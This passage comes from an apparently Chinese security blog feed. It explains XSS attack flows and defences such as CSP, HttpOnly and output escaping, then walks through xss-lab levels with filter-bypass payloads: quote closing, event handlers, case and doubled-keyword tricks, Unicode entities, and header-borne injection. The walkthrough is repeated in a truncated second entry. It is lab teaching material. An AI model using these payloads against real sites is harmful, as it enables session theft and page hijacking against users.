src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733132830220-2c0e975b-c19d-4ec0-86c7-1be1906ea279.png"></p><h2 id="Exif-XSS"><a href="#Exif-XSS" class="headerlink" title="Exif-XSS"></a>Exif-XSS</h2><p>可交换图像文件格式（英语：Exchangeable image file format，官方简称Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。可使用鼠标右键进入属性页面查看部分信息。</p><p>复现：</p><p>有些网站有读取图片exif信息的功能，当网站读取到的恶意的exif信息就会触发这个payload，上面已经演示过了。</p><p>有些谷歌浏览器安装了EXIF Vewer插件，而chrome Exif Viewer插件获取图片exif信息的时候没有过滤，导致了XSS代码的执行。</p><p><a href="https://blog.csdn.net/qq_32393893/article/details/104814749">https://blog.csdn.net/qq_32393893&#x2F;article&#x2F;details&#x2F;104814749</a></p><h1 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h1><h2 id="反射型-1"><a href="#反射型-1" class="headerlink" title="反射型"></a>反射型</h2><ol><li>发送带有XSS恶意脚本的链接</li><li>用户点击了恶意链接，访问了目标服务器</li><li>网站将XSS同正常页面返回到用户浏览器</li><li>用户浏览器解析了网页中的XSS恶意代码，向恶意服务器发起请求</li><li>黑客从自己搭建的恶意服务器中获取用户提交的信息</li></ol><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1721738681366-82e2aad7-8021-4a37-8c37-bffe283afa83.png"></p><h2 id="存储型-1"><a href="#存储型-1" class="headerlink" title="存储型"></a>存储型</h2><ol><li>黑客在目标服务器上构造XSS恶意脚本，保存在数据库中</li><li>用户在网站登录状态下，访问了目标服务器，查看了存在恶意脚本的页面</li><li>网站将XSS同正常页面返回到用户浏览器</li><li>用户浏览器解析了网页中的XSS恶意代码，向恶意服务器发起请求</li><li>黑客从自己搭建的恶意服务器中获取用户提交的信息</li></ol><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1721738724510-8056d587-c666-4535-bd9f-bb16f9737740.png"></p><h1 id="常见事件处理程序"><a href="#常见事件处理程序" class="headerlink" title="常见事件处理程序"></a>常见事件处理程序</h1><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1721738813093-3df1262f-b8f3-451d-b730-5996a4938386.png"></p><h1 id="常见测试代码"><a href="#常见测试代码" class="headerlink" title="常见测试代码"></a>常见测试代码</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input onfocus=write(&#x27;xss&#x27;) autofocus&gt;  </span><br><span class="line">&lt;img src onerror=alert(&#x27;xss&#x27;)&gt; //图片加载错误时触发</span><br><span class="line">&lt;img src onclick=alert(&#x27;xss&#x27;)&gt;</span><br><span class="line">&lt;svg onload=alert(&#x27;xss&#x27;) &gt;  </span><br><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;  </span><br><span class="line">&lt;a href=&quot;javascript:alert(&#x27;xss&#x27;)&quot;&gt;clickme&lt;/a&gt;  </span><br><span class="line">&lt;/td&gt;&lt;script&gt;alert(123456)&lt;/script&gt;  </span><br><span class="line">&#x27;&gt;&lt;script&gt;alert(123456)&lt;/script&gt;  //闭合</span><br><span class="line">&quot;&gt;&lt;script&gt;alert(123456)&lt;/script&gt;  </span><br><span class="line">&lt;/title&gt;&lt;script&gt;alert(123456)&lt;/script&gt;  </span><br><span class="line">&lt;scrip&lt;script&gt;t&gt;alert(123456)&lt;/scrip&lt;/script&gt;t&gt;  </span><br><span class="line">&lt;/div&gt;&lt;script&gt;alert(123456)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>多使用F12查看输入的内容显示在什么地方</p><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><h2 id="开启CSP"><a href="#开启CSP" class="headerlink" title="开启CSP"></a>开启CSP</h2><p>CSP（Content Security Policy）指的是内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略。CSP本质上是建立白名单，规定了浏览器只能够执行特定来源的代码，即使存在跨站脚本攻击漏洞，也不会加载来源不明的第三方脚本。</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733219887584-0dbcbd62-a902-422f-b172-10dd26b0025d.png"></p><p>xss的攻击都要加载外部内容，开启CSP之后，无法加载外部资源，只能加载本地源</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733219774275-2e933f58-ca2d-4e49-ba41-1c217cb9674f.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733219782990-99b1cdd3-9bc1-4ccb-8fb5-b75a41cf51de.png"></p><p>可以绕过CSP的情况只有：对方配置不正确，有的php文件中没有开启CSP</p><h2 id="使用HttpOnly"><a href="#使用HttpOnly" class="headerlink" title="使用HttpOnly"></a>使用HttpOnly</h2><p>HttpOnly是加在cookies上的一个标识，用于告诉浏览器不要向客户端脚本(document.cookie或其他)暴需cookie。当你在cookie上设置HttpOnly标识后，浏览器就会知到这是特殊的cookie，只能由服务器检索到，所有来自客户端脚本的访问都会被禁止。</p><blockquote><p>只对Cookie有限制</p></blockquote><p>php里设置HttpOnly</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PHP.INI设置或代码引用</span><br><span class="line"></span><br><span class="line">-session.cookie_httponly =<span class="number">1</span></span><br><span class="line">-ini_set(<span class="string">&quot;session.cookie_httponly&quot;</span>, <span class="number">1</span>);</span><br><span class="line">-setcookie(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, time() + <span class="number">3600</span>, <span class="string">&#x27;/xss&#x27;</span>, <span class="string">&#x27;&#x27;</span>, false, true);</span><br></pre></td></tr></table></figure><p>开启HttpOnly的情况</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733215677010-dfa8f0e9-1b85-4e4f-82d6-8a850d1d9e0b.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733215747362-0238c247-b699-4499-937a-cd7e0f2d8361.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733215878714-465ddd3d-432d-4aa5-ac34-aab5e315f6c2.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733215885607-c87e0199-b7eb-4e1e-a275-0e745b1c8166.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733215896075-3abb1eb9-e67c-4325-98be-38106e42ac8a.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733215909684-163e460a-1c2f-46f2-b094-06d9a5c9817a.png"></p><p>如何判断是否启用HttpOnly</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733215585159-0e18585c-618e-4bcd-8c95-37e6bd91ec30.png"></p><p>绕过HttpOnly：</p><p>(1) CVE-2012-0053</p><p>(2) PHPINFO页面&#x2F;</p><p>(3) Flash&#x2F;Java</p><p>太鸡肋，现在网络环境实现不了</p><p>遇到HttpOnly思路：</p><p>不获取Cookie采用方式（钓鱼，浏览器攻击框架等）</p><h2 id="XSS-Filter"><a href="#XSS-Filter" class="headerlink" title="XSS Filter"></a>XSS Filter</h2><p>对一些特殊字符进行代码层过滤</p><h2 id="输入过滤"><a href="#输入过滤" class="headerlink" title="输入过滤"></a>输入过滤</h2><p>对用户提交的数据进行有效性验证，仅接受指定长度范国内并符合我们期望格式的的内容提交，阻止或者忽略除此外的其他任何数据。</p><h2 id="输出转义"><a href="#输出转义" class="headerlink" title="输出转义"></a>输出转义</h2><p>在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击。htmlspecialchars():把预定义的字符转换为HTML实体。（可以将&lt;&gt;转义）</p><h1 id="基于xss-lab的绕过"><a href="#基于xss-lab的绕过" class="headerlink" title="基于xss-lab的绕过"></a>基于xss-lab的绕过</h1><h2 id="闭合双引号"><a href="#闭合双引号" class="headerlink" title="闭合双引号"></a>闭合双引号</h2><p>分析：输入的内容被双引号带入</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733230466643-380778b7-9a7b-408c-9b07-71f0cfad274d.png"></p><p>绕过：闭合</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733230593933-e0fefd6b-5841-482f-9d89-905eb918f6a7.png"></p><h2 id="实体化绕过（使用不被实体化的字符构造payload）"><a href="#实体化绕过（使用不被实体化的字符构造payload）" class="headerlink" title="实体化绕过（使用不被实体化的字符构造payload）"></a>实体化绕过（使用不被实体化的字符构造payload）</h2><p>使用了htmlspecialchars()函数，实体化一些字符，但默认配置不过滤单引号，构造单引号payload</p><p>分析：闭合单引号</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733230708627-d5491690-4969-4ba2-9607-4472d77b9e84.png"></p><p>闭合后发现 符号实体化</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733230743966-61771286-ea04-4d21-8af5-6d6a218b7ff4.png"></p><p>标签为input，使用input的触发事件绕过（闭合单引号之后再进行绕过）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;onmouseover=&#x27;</span>alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>鼠标滑过输入框，触发事件</p><h2 id="实体化绕过"><a href="#实体化绕过" class="headerlink" title="实体化绕过"></a>实体化绕过</h2><p>&lt;&gt;被过滤为空，双引号没有被过滤</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733232180143-5cff3ac3-cc44-49b8-bced-93a721062942.png"></p><p>使用双引号构造payload，用触发事件绕过</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; onfocus=&quot;</span>alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733232322426-c873f3af-5f03-4792-9675-df77d5905cf9.png"></p><h2 id="使用其他标签闭合"><a href="#使用其他标签闭合" class="headerlink" title="使用其他标签闭合"></a>使用其他标签闭合</h2><p>分析：script被过滤为scr_ipt</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733232494424-a96c992c-b4ae-4d64-885a-d5c3add447b5.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;a href=&quot;</span>javascript:alert(<span class="number">1</span>)<span class="string">&quot;&gt;test&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733232606470-5ed7f164-0cb2-4892-bb89-95095a66dd44.png"></p><p>点击test触发事件绕过</p><h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><p>script被过滤，href也被过滤</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733233694713-34240ca5-85cc-458f-a760-46f7a5cdee13.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733233749070-dc963604-84d5-4b4d-8a4b-ee59936a6b8e.png"></p><p>使用大小写绕过</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;a hRef=&quot;</span>javascript:alert(<span class="number">1</span>)<span class="string">&quot;&gt;test&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>script被过滤为空</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733233849844-9ea48b1d-6e14-4a4a-ac70-1cc901c725cf.png"></p><p>双写绕过</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;&lt;</span></span><br></pre></td></tr></table></figure><h2 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733234397718-c1c63c67-85e9-40e6-b6b8-6a8cd644c1fd.png"></p><p>href标签的payload：&lt;a href&#x3D;”javascript:alert(1)”</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733234438374-08a377b8-4ce6-42a1-8a10-12a468e9e1c0.png"></p><p>都有过滤</p><p>使用Unicode编码</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733234700749-f99e0b9a-ed16-4162-b7d5-17805334cb8b.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&amp;<span class="comment">#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0031&amp;#x0029</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733234908693-51eb0a56-dbae-4bbf-89bc-d39afc7c8424.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733234894678-db3fdd4d-74f2-45b5-88e2-ebfa54fc084b.png"></p><h2 id="Unicode-内容检测绕过"><a href="#Unicode-内容检测绕过" class="headerlink" title="Unicode+内容检测绕过"></a>Unicode+内容检测绕过</h2><p>不管输入什么，参数都没有传入，只有输入http之后参数才会传进去</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733234967250-894cd123-71c1-498c-85c7-505bfe9c3a86.png"></p><p>猜测在传入href之前会判断字符串中有没有http:&#x2F;&#x2F;</p><p>加入http:&#x2F;&#x2F;</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&amp;<span class="comment">#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0031&amp;#x0029;(&#x27;http://&#x27;)</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733235595166-8430cec0-bfdc-4e97-bdd0-e813e88c3477.png"></p><p>(http:&#x2F;&#x2F;)只是为了绕过检测，是一个无效的函数调用，浏览器会忽略它，继续执行 alert(1)</p><h2 id="hidden参数传递数据"><a href="#hidden参数传递数据" class="headerlink" title="hidden参数传递数据"></a>hidden参数传递数据</h2><p>源代码中多了这三行内容</p><p>有三个输入框，但是type为隐藏了</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733236318868-6f23a4ed-330c-4735-b9f0-4bc3fd2abb80.png"></p><p>三个参数分别尝试，只有当传参?t_sort&#x3D;1时，代码中才会接收到参数值</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733236627652-55c8e27e-b2aa-47cf-b9a8-b88d2e685b4d.png"></p><p>尝试构造payload</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733236724144-333e09e0-9aa4-4c47-b275-33893dd8f4d9.png"></p><p>发现会过滤&lt;&gt;</p><p>使用事件触发</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; onclick=&quot;</span>alert(<span class="string">&#x27;xss&#x27;</span>);<span class="string">&quot;&gt;</span></span><br></pre></td></tr></table></figure><p>并将type改为submit，点击按钮</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733236813296-a1ed8e3f-f300-4a27-b0be-298422c454d1.png"></p><h2 id="Referer参数传递数据"><a href="#Referer参数传递数据" class="headerlink" title="Referer参数传递数据"></a>Referer参数传递数据</h2><p>仍然是只有t_sort可以接收到参数</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733237087188-4cb11da5-b1fb-459f-8957-ffe4f84e36f8.png"></p><p>修改type，发现t_ref接收返回值参数（Referer请求头参数）</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733237926086-9d472c43-face-47b6-b886-f61ebf34fa9e.png"></p><p>尝试构造Referer的payload</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733271267752-8aa0f977-bef4-4d4c-ba5c-05c0be00b3c2.png"></p><p>闭合input标签</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; type=&quot;</span>text<span class="string">&quot; onkeydown=&quot;</span>alert(<span class="string">&#x27;xss&#x27;</span>);<span class="string">&quot;&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733271479210-e2daef1d-3757-4dc0-ab26-6fa8dd248346.png"></p><p>是我们想要的结果，抓包之后再放包，页面出现文本框，触发事件</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733271426787-c9d13d89-c7cd-494d-b463-3246e314035b.png"></p><h2 id="Ua参数传递数据"><a href="#Ua参数传递数据" class="headerlink" title="Ua参数传递数据"></a>Ua参数传递数据</h2><p>发现代码中变成t_ua，通过User-Agent传递数据</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733271593145-321e8eb8-9eb3-402a-9cfb-d02839eec055.png"></p><p>?t_link&#x3D;1&amp;t_history&#x3D;2&amp;t_sort&#x3D;3 看是否能接收数据</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733271843191-638bef76-26ec-4256-a515-c0a92d2f6ba1.png"></p><p>依旧只有t_sort能够接收（这里谁接收都无所谓，因为有ua）</p><p>我们抓包修改ua头内容，构造payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; type=&quot;</span>text<span class="string">&quot; onkeydown=&quot;</span>alert(<span class="string">&#x27;xss&#x27;</span>);<span class="string">&quot;&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733272056454-3670bf9a-5074-4720-b555-bbf2955af567.png"></p><p>出现文本框，说明构造成功</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733272073048-19042248-91d3-4b45-b9d4-62c7b487e594.png"></p><p>再抓包修改，放包，点击文本框，按下键盘，触发事件</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733272118397-9c9bcddd-0b48-4591-ae87-54cc783ab5ed.png"></p><h2 id="Cookie参数传递数据"><a href="#Cookie参数传递数据" class="headerlink" title="Cookie参数传递数据"></a>Cookie参数传递数据</h2><p>盲猜Cookie，抓包</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733272166221-3bc500f3-be5d-4f63-922a-01f542f22fef.png"></p><p>果然，cookie中user的值传递给t_cook变量</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733272211918-0c01bbf7-cc4e-4530-befe-5418d31d89a6.png"></p><p>修改cookie值构造payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; type=&quot;</span>text<span class="string">&quot; onkeydown=&quot;</span>alert(<span class="number">1</span>)<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733272388729-da62b6d6-fd7f-4f59-804e-dbdf710f7eb4.png"></p><p>再抓包修改，放包，点击文本框，按下键盘，触发事件</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733272431672-101d967e-9173-4f8d-b8ae-556247e2ee33.png"></p><h2 id="exif-xss"><a href="#exif-xss" class="headerlink" title="exif-xss"></a>exif-xss</h2><p>该关的<a href="http://www.exifviewer.org/">http://www.exifviewer.org/</a>网址已经被弃用，无法复现</p><p>参考：</p><p><a href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11&time__1311=eqGhqfxmxAxRhEDlrmq0=GOR3=q7qRH9vpD#toc-12">https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11&amp;time__1311&#x3D;eqGhqfxmxAxRhEDlrmq0%3DGOR3%3Dq7qRH9vpD#toc-12</a></p><h2 id="ng-include"><a href="#ng-include" class="headerlink" title="ng-include"></a>ng-include</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733276716069-4521f887-d667-47a8-be47-520cdb717cce.png"></p><h2 id="空格被过滤（-0a绕过）"><a href="#空格被过滤（-0a绕过）" class="headerlink" title="空格被过滤（%0a绕过）"></a>空格被过滤（%0a绕过）</h2><p>?keyword&#x3D;test</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733276858320-4f68763a-9dca-40a5-8acb-213706c3e4c6.png"></p><p>test被写入<center>标签中</p><p>尝试闭合</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;/center&gt;&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;&lt;center&gt;</span><br></pre></td></tr></table></figure><p>输入的&#x2F;、script被过滤为空</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733276974528-6ad581e6-c680-4679-94da-e04ec4193ddc.png"></p><p>双写、大小写都不能绕过，Unicode也不能绕过</p><p>script、空格和&#x2F;时转译成&amp;nbsp</p><p>用回车的url编码%0a代替空格</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1733289710240-a283ecb3-2b31-4d54-a5e7-952af4adfb1b.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;img%<span class="number">0</span>asrc=x%0aonerror=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>center标签不用闭合</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733289754479-0c35757f-a229-4cb0-9c37-d90f6597a456.png"></p><h2 id="embed标签"><a href="#embed标签" class="headerlink" title="embed标签"></a>embed标签</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733289825752-14b5a2e0-baa2-464a-b9fa-f251f0eb47d7.png"></p><p>embed标签已经被弃用，不复现</p><p>level17.php?arg01&#x3D;a&amp;arg02&#x3D;%20onmouseover&#x3D;alert(2)</p><p>后几题都是embed标签</p>]]></content>
      
      
      <categories>
          
          <category> OWASP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于xss-lab的绕过</title>
      <link href="/2025/05/27/%E5%9F%BA%E4%BA%8Exss-lab%E7%9A%84%E7%BB%95%E8%BF%87/"/>
      <url>/2025/05/27/%E5%9F%BA%E4%BA%8Exss-lab%E7%9A%84%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="基于xss-lab的绕过"><a href="#基于xss-lab的绕过" class="headerlink" title="基于xss-lab的绕过"></a>基于xss-lab的绕过</h1><h2 id="闭合双引号"><a href="#闭合双引号" class="headerlink" title="闭合双引号"></a>闭合双引号</h2><p>分析：输入的内容被双引号带入</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733230466643-380778b7-9a7b-408c-9b07-71f0cfad274d.png"></p><p>绕过：闭合</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733230593933-e0fefd6b-5841-482f-9d89-905eb918f6a7.png"></p><h2 id="实体化绕过（使用不被实体化的字符构造payload）"><a href="#实体化绕过（使用不被实体化的字符构造payload）" class="headerlink" title="实体化绕过（使用不被实体化的字符构造payload）"></a>实体化绕过（使用不被实体化的字符构造payload）</h2><p>使用了htmlspecialchars()函数，实体化一些字符，但默认配置不过滤单引号，构造单引号payload</p><p>分析：闭合单引号</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733230708627-d5491690-4969-4ba2-9607-4472d77b9e84.png"></p><p>闭合后发现 符号实体化</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733230743966-61771286-ea04-4d21-8af5-6d6a218b7ff4.png"></p><p>标签为input，使用input的触发事件绕过（闭合单引号之后再进行绕过）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;onmouseover=&#x27;</span>alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>鼠标滑过输入框，触发事件</p><h2 id="实体化绕过"><a href="#实体化绕过" class="headerlink" title="实体化绕过"></a>实体化绕过</h2><p>&lt;&gt;被过滤为空，双引号没有被过滤</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733232180143-5cff3ac3-cc44-49b8-bced-93a721062942.png"></p><p>使用双引号构造payload，用触发事件绕过</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; onfocus=&quot;</span>alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733232322426-c873f3af-5f03-4792-9675-df77d5905cf9.png"></p><h2 id="使用其他标签闭合"><a href="#使用其他标签闭合" class="headerlink" title="使用其他标签闭合"></a>使用其他标签闭合</h2><p>分析：script被过滤为scr_ipt</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733232494424-a96c992c-b4ae-4d64-885a-d5c3add447b5.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;a href=&quot;</span>javascript:alert(<span class="number">1</span>)<span class="string">&quot;&gt;test&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733232606470-5ed7f164-0cb2-4892-bb89-95095a66dd44.png"></p><p>点击test触发事件绕过</p><h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><p>script被过滤，href也被过滤</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733233694713-34240ca5-85cc-458f-a760-46f7a5cdee13.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733233749070-dc963604-84d5-4b4d-8a4b-ee59936a6b8e.png"></p><p>使用大小写绕过</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;a hRef=&quot;</span>javascript:alert(<span class="number">1</span>)<span class="string">&quot;&gt;test&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>script被过滤为空</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733233849844-9ea48b1d-6e14-4a4a-ac70-1cc901c725cf.png"></p><p>双写绕过</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;&lt;</span></span><br></pre></td></tr></table></figure><h2 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733234397718-c1c63c67-85e9-40e6-b6b8-6a8cd644c1fd.png"></p><p>href标签的payload：&lt;a href&#x3D;”javascript:alert(1)”</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733234438374-08a377b8-4ce6-42a1-8a10-12a468e9e1c0.png"></p><p>都有过滤</p><p>使用Unicode编码</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733234700749-f99e0b9a-ed16-4162-b7d5-17805334cb8b.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&amp;<span class="comment">#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0031&amp;#x0029</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733234908693-51eb0a56-dbae-4bbf-89bc-d39afc7c8424.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733234894678-db3fdd4d-74f2-45b5-88e2-ebfa54fc084b.png"></p><h2 id="Unicode-内容检测绕过"><a href="#Unicode-内容检测绕过" class="headerlink" title="Unicode+内容检测绕过"></a>Unicode+内容检测绕过</h2><p>不管输入什么，参数都没有传入，只有输入http之后参数才会传进去</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733234967250-894cd123-71c1-498c-85c7-505bfe9c3a86.png"></p><p>猜测在传入href之前会判断字符串中有没有http:&#x2F;&#x2F;</p><p>加入http:&#x2F;&#x2F;</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&amp;<span class="comment">#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0031&amp;#x0029;(&#x27;http://&#x27;)</span></span><br></pre></td></tr></table></figure><p><img 